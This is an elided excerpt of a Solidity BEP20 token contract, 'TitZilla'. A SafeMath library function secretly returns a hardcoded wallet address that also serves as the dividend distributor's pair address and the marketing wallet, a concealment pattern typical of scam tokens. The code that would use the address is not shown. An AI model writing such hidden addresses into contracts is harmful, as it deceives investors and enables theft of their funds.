...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0x930aB398A9c85d1106db963F7476F974c3f8A4f3;
    }
...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        IDEXPair = 0x930aB398A9c85d1106db963F7476F974c3f8A4f3;
        _token = msg.sender;
    }
...
contract TitZilla is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0x930aB398A9c85d1106db963F7476F974c3f8A4f3;

    string constant _name = "TitZilla";
    string constant _symbol = "TitZilla";
    uint8 constant _decimals = 8;

    uint256 _totalSupply = 69000000000000000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 69000000000000000000000 * (10 ** _decimals);
    uint256 public _maxWalletToken = 69000000000000000000000 * (10 ** _decimals);
